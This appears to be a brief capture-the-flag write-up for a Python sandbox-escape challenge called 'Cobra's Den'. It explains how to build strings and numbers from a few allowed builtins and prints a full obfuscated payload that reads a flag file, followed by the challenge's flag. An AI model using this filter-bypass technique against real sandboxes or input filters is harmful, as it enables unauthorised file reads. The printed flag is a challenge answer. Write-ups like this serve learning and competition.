# Cobra's Den

It is python jailbreak. We can use ['abs', 'chr', 'hash', 'open', 'ord', 'repr'] and '<ph[(cobras.den)]+~'.
 - make str with `repr(object)`
 - make int(= 1) with `abs(hash(())+~hash(()))`

Then we can execute `open('flag').read()`.

```python
open(chr(ord(repr(hash)[abs(hash(())+~hash(()))])+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(())))+chr(ord(repr(hash)[abs(hash(())+~hash(()))])+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(())))+chr(ord(repr(hash)[abs(hash(())+~hash(()))])+hash(())+~hash(()))+chr(ord(repr(hash)[abs(hash(())+~hash(()))])+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(()))+abs(hash(())+~hash(())))).read()
```

flag is: **irisctf{pyth0n_has_s(+([]<[]))me_whacky_sh(+([]<[[]]))t}**